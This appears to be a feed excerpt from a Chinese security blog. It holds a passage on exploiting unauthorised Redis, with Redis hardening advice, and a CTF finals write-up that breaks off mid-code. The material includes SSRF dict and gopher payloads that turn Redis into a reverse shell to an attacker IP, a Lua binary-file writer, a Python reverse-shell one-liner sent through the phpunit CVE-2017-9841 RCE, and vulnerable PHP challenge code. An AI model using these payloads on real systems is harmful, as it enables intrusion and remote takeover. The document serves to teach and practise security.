class="line">whoami</span><br></pre></td></tr></table></figure><h2 id="SSRF-反弹-Shell"><a href="#SSRF-反弹-Shell" class="headerlink" title="SSRF 反弹 Shell"></a>SSRF 反弹 Shell</h2><p><strong>参照 Redis 手动 Getshell 的过程，当站点存在漏洞时可利用 SSRF 反弹 Shell</strong></p><p><strong>测试漏洞页面  <code>ssrf.php</code></strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li><strong>模拟内网未授权 Redis 服务器：172.16.186.4</strong></li><li><strong>模拟攻击者机器：192.168.0.107</strong></li><li><strong>在攻击者机器上构建恶意 Redis 服务器，同时监听本地 9999 端口接收 Shell</strong></li></ul><h3 id="利用-dict-协议反弹-Shell"><a href="#利用-dict-协议反弹-Shell" class="headerlink" title="利用 dict 协议反弹 Shell"></a>利用 dict 协议反弹 Shell</h3><p><strong>利用方式：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前redis的相关配置</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;172.16.186.4:6379&#x2F;info</span><br><span class="line"></span><br><span class="line"># 设置备份文件名</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;172.16.186.4:6379&#x2F;config:set:dbfilename:exp.so</span><br><span class="line"></span><br><span class="line"># 连接恶意Redis服务器</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;172.16.186.4:6379&#x2F;slaveof:192.168.0.107:1234</span><br><span class="line"></span><br><span class="line"># 加载恶意模块</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;172.16.186.4:6379&#x2F;module:load:.&#x2F;exp.so</span><br><span class="line"></span><br><span class="line"># 切断主从复制</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;172.16.186.4:6379&#x2F;slaveof:no:one</span><br><span class="line"></span><br><span class="line"># 执行系统命令</span><br><span class="line"> ssrf.php?url&#x3D;dict:&#x2F;&#x2F;172.16.186.4:6379&#x2F;system.rev:192.168.0.107:9999</span><br></pre></td></tr></table></figure><h3 id="利用-Gopher-协议反弹-Shell"><a href="#利用-Gopher-协议反弹-Shell" class="headerlink" title="利用 Gopher 协议反弹 Shell"></a>利用 Gopher 协议反弹 Shell</h3><p><strong>利用方式：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 设置文件名，连接恶意Redis服务器</span><br><span class="line">gopher:&#x2F;&#x2F;172.16.186.4:6379&#x2F;_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.0.107%25201234%250d%250aquit</span><br><span class="line"></span><br><span class="line"># 加载exp.so，反弹shell</span><br><span class="line">gopher:&#x2F;&#x2F;172.16.186.4:6379&#x2F;_module%2520load%2520.&#x2F;exp.so%250d%250asystem.rev%2520192.168.0.107%25209999%250d%250aquit</span><br></pre></td></tr></table></figure><blockquote><p>Get 请求会自动解码一次所以这里需要进行两次 URL 编码</p></blockquote><hr><h1 id="Lua-脚本执行命令"><a href="#Lua-脚本执行命令" class="headerlink" title="Lua 脚本执行命令"></a>Lua 脚本执行命令</h1><p><strong>Redis 2.6以前的版本内置了lua脚本环境，在有连接redis服务器的权限下，可以利用lua执行系统命令。</strong></p><p><strong>本地建立一个lua脚本：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim  hello.lua</span><br><span class="line"><span class="built_in">local</span> msg = <span class="string">&quot;hello.hack!&quot;</span></span><br><span class="line"><span class="built_in">return</span> msg</span><br></pre></td></tr></table></figure><p><strong>在客户端连接 Redis 服务器并执行 hello.lua</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(cat hello.lua)</span>&quot;</span> 0 -h 172.16.186.4</span><br></pre></td></tr></table></figure><h1 id="写二进制文件-利用dns、icmp等协议上线-tcp协议不能出网"><a href="#写二进制文件-利用dns、icmp等协议上线-tcp协议不能出网" class="headerlink" title="写二进制文件 利用dns、icmp等协议上线 (tcp协议不能出网)"></a>写二进制文件 利用dns、icmp等协议上线 (tcp协议不能出网)</h1><p><strong>写二进制文件的方法跟前边有所不同，原因在于使用 RDB 方式备份 Redis 数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用 python清洗脏数据。</strong></p><ol><li><strong>创建一个 a.lua 其内容如下：</strong></li></ol><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">hex2bin</span><span class="params">(hexstr)</span></span></span><br><span class="line">    <span class="keyword">local</span> str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(hexstr) - <span class="number">1</span>, <span class="number">2</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> doublebytestr = <span class="built_in">string</span>.<span class="built_in">sub</span>(hexstr, i, i+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">local</span> n = <span class="built_in">tonumber</span>(doublebytestr, <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == n <span class="keyword">then</span></span><br><span class="line">            str = str .. <span class="string">&#x27;\00&#x27;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            str = str .. <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%c&quot;</span>, n)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> dir = redis.call(<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">redis.call(<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;dir&#x27;</span>,<span class="string">&#x27;/tmp/&#x27;</span>)</span><br><span class="line"><span class="keyword">local</span> dbfilename = redis.call(<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;dbfilename&#x27;</span>)</span><br><span class="line">redis.call(<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;dbfilename&#x27;</span>,<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line"><span class="keyword">local</span> rdbcompress = redis.call(<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;rdbcompression&#x27;</span>)</span><br><span class="line">redis.call(<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;rdbcompression&#x27;</span>,<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">redis.call(<span class="string">&#x27;flushall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> data = <span class="string">&#x27;1a2b3c4d5e6f1223344556677890aa&#x27;</span></span><br><span class="line">redis.call(<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,hex2bin(<span class="string">&#x27;0a7c7c7c&#x27;</span>..data..<span class="string">&#x27;7c7c7c0a&#x27;</span>))</span><br><span class="line"><span class="keyword">local</span> rst = &#123;&#125;</span><br><span class="line">rst[<span class="number">1</span>] = <span class="string">&#x27;server default config&#x27;</span></span><br><span class="line">rst[<span class="number">2</span>] = <span class="string">&#x27;dir:&#x27;</span>..dir[<span class="number">2</span>]</span><br><span class="line">rst[<span class="number">3</span>] = <span class="string">&#x27;dbfilename:&#x27;</span>..dbfilename[<span class="number">2</span>]</span><br><span class="line">rst[<span class="number">4</span>] = <span class="string">&#x27;rdbcompression:&#x27;</span>..rdbcompress[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> rst</span><br></pre></td></tr></table></figure><blockquote><p>变量data保存的是程序的16进制编码</p></blockquote><ol start="2"><li><strong>利用 redis 执行该 lua 脚本</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli --<span class="built_in">eval</span> a.lua -h 172.16.186.4</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>由于 redis 不支持在 lua 中调用 save 因此需要手动执行 save 操作,并且删除 key data，恢复 dir 等。</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli save -h 172.16.186.4</span><br><span class="line">redis-cli config <span class="built_in">set</span> dir *** -h 172.16.186.4</span><br><span class="line">redis-cli config <span class="built_in">set</span> dbfilename *** -h 172.16.186.4</span><br><span class="line">redis-cli config <span class="built_in">set</span> rdbcompression * -h 172.16.186.4</span><br></pre></td></tr></table></figure><p><strong>目前写入的文件前后是存在垃圾数据的，需要通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了 <code>|||</code> 作为提取最终文件的标识）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * python -c <span class="string">&#x27;open(&quot;/tmp/rst&quot;,&quot;a+&quot;).write(open(&quot;/tmp/t&quot;).read().split(&quot;|||&quot;)[1])&#x27;</span></span><br></pre></td></tr></table></figure><hr><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ol><li><p><strong>禁止Redis服务对公网开放，可通过修改 <code>redis.conf</code> 配置文件中的 <code>#bind 127.0.0.1</code> ，去掉前面的 <code>#</code> 即可（Redis本来就是作为内存数据库，只要监听在本机即可）</strong></p></li><li><p><strong>设置密码访问认证，可通过修改 <code>redis.conf</code> 配置文件中的 <code>requirepass</code>  设置复杂密码 （需要重启 Redis 服务才能生效）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword  （注意redis不要用-a参数，明文输入密码，连接后使用auth认证）</span><br></pre></td></tr></table></figure></li><li><p><strong>对访问源 IP 进行访问控制，可在防火墙限定指定源 IP 才可以连接 Redis 服务器</strong></p></li><li><p><strong>修改 Redis 默认端口，将默认的6379端口修改为其他端口。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 6379</span><br></pre></td></tr></table></figure></li><li><p><strong>保证 authorized_keys 文件的安全</strong></p><p>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod 400 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chattr +i ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chattr +i ~/.ssh</span><br></pre></td></tr></table></figure><p>注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p></li><li><p><strong>禁止一些高危命令（重启redis才能生效)</strong></p><p>修改 redis.conf 文件，禁用远程修改 DB 文件地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rename-command CONFIG <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rename-command EVAL <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>或者通过修改redis.conf文件，改变这些高危命令的名称：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">&quot;name1&quot;</span></span><br><span class="line"></span><br><span class="line">rename-command CONFIG <span class="string">&quot;name2&quot;</span></span><br><span class="line"></span><br><span class="line">rename-command EVAL <span class="string">&quot;name3&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>以低权限运行 Redis 服务（重启redis才能生效）</strong></p><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://sec.nmask.cn/article_content?a_id=c06f13f3f169ba5fee2761ad234e9805">https://sec.nmask.cn/article_content?a_id=c06f13f3f169ba5fee2761ad234e9805</a></li><li><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Crontab-计划任务&quot;&gt;&lt;a href=&quot;#Crontab-计划任务&quot; class=&quot;headerlink&quot; title=&quot;Crontab 计划任务&quot;&gt;&lt;/a&gt;Crontab 计划任务&lt;/h1&gt;&lt;p&gt;Crontab 是 Linux系统或 Unix 系统中常用的</summary>
      
    
    
    
    <category term="Note" scheme="https://www.lintstar.top/categories/Note/"/>
    
    <category term="Web" scheme="https://www.lintstar.top/categories/Note/Web/"/>
    
    
    <category term="Web" scheme="https://www.lintstar.top/tags/Web/"/>
    
    <category term="Crontab" scheme="https://www.lintstar.top/tags/Crontab/"/>
    
    <category term="Vulnerability" scheme="https://www.lintstar.top/tags/Vulnerability/"/>
    
    <category term="Redis" scheme="https://www.lintstar.top/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>蓝帽杯决赛 WRITEUP</title>
    <link href="https://www.lintstar.top/2020/12/784edd2e.html"/>
    <id>https://www.lintstar.top/2020/12/784edd2e.html</id>
    <published>2020-12-21T10:22:22.000Z</published>
    <updated>2020-12-21T14:22:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>上周六参加『 蓝帽杯 』全国大学生网络安全技能大赛线上决赛记录，先挖个坑等一手之后官方的 WP 。</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201221144501.png" alt="image-20201221144445748"></p><h1 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h1><h2 id="操作内容"><a href="#操作内容" class="headerlink" title="操作内容"></a>操作内容</h2><p>题目给了一些数字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[102, 108, 97, 103, 123, 119, 101, 49, 99, 48, 109, 101, 95, 98, 108, 117, 101, 99, 97, 116, 125]</span><br></pre></td></tr></table></figure><p>尝试 AscII 8进制解码：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219174646.png" alt="image-20201219174646505"></p><h2 id="flag-值"><a href="#flag-值" class="headerlink" title="flag 值"></a>flag 值</h2><p><strong>flag{we1c0me_bluecat}</strong></p><h1 id="0x02-php"><a href="#0x02-php" class="headerlink" title="0x02 php"></a>0x02 php</h1><h2 id="操作内容-1"><a href="#操作内容-1" class="headerlink" title="操作内容"></a>操作内容</h2><p>查看源代码：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219181441.png" alt="image-20201219181441608"></p><p>想到 phpunit 远程命令执行漏洞（CVE-2017-9841）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;vendor&#x2F;phpunit&#x2F;phpunit&#x2F;src&#x2F;Util&#x2F;PHP&#x2F;eval-stdin.php</span><br></pre></td></tr></table></figure><p>先试了 post <code>&lt;?php print_r(scandir(&#39;/&#39;));</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219195133.png" alt="20201219_1201"></p><p><code>&lt;?php show_source(&#39;/flag&#39;);</code> 读取失败 似乎是没权限</p><p>通过尝试发现 pcntl_exec（）函数可以使用，进行反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  pcntl_exec(<span class="string">&quot;/usr/bin/python&quot;</span>,array(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));?&gt;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219182449.png" alt="20201219_1632"></p><p><code>cat /flag</code>  权限不够，<code>ls - la</code> 发现用户为 www-data, 而 <code>/flag</code>文件为 admin 权限</p><p>尝试切换 admin 权限报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure><p>切换交互型 shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>在  <code>var/www/html </code> 下翻到了 admin 的密码：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219183127.png" alt="20201219_1656"></p><p>cat 一下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219183159.png" alt="20201219_16561"></p><p>执行 su admin 拿到 flag</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219183244.png" alt="20201219_1651"></p><h2 id="flag-值-1"><a href="#flag-值-1" class="headerlink" title="flag 值"></a>flag 值</h2><p><strong>flag{c31a77bd-5d01-4074-ab57-7828d7e85943}</strong></p><h1 id="0x03-login"><a href="#0x03-login" class="headerlink" title="0x03 login"></a>0x03 login</h1><h2 id="操作内容-2"><a href="#操作内容-2" class="headerlink" title="操作内容"></a>操作内容</h2><p>使用 Dirsearch 进行目录扫描：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201219184240.png" alt="image-20201219184240437"></p><p>泄露 <a href="http://www.zip/">www.zip</a> 内容为config.php 和 index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $user;</span><br><span class="line">    <span class="keyword">public</span> $pass;</span><br><span class="line">    <span class="keyword">public</span> $repass;</span><br><span class="line">    <span class="keyword">public</span> $dir;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data1, $data2, $data3, $data4</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $data1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $data2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;repass = $data3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dir = $data4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">$this</span>-&gt;user == <span class="string">&#x27;ohhhh&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;pass == <span class="string">&#x27;a3333&#x27;</span>) || (<span class="keyword">$this</span>-&gt;user == <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;pass == <span class="string">&#x27;admin888&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;Login()) &#123;</span><br><span class="line">    readfile(<span class="keyword">$this</span>-&gt;dir);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;wrong user or pass&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">        $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;hacker&#x27;</span>,$data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;repass&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;dir&#x27;</span>])) &#123;</span><br><span class="line">    $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    $repass = $_GET[<span class="string">&#x27;repass&#x27;</span>];</span><br><span class="line">    $dir = $_GET[<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line">    $get = filter(serialize($_GET));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;file-reading&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">username&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;user&quot;</span>&gt;</span><br><span class="line">password&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;pass&quot;</span>&gt;</span><br><span class="line">repassword&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;repass&quot;</span>&gt;</span><br><span class="line">filename&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;dir&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">only admin can view /flag</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">$data = unserialize($get);</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span 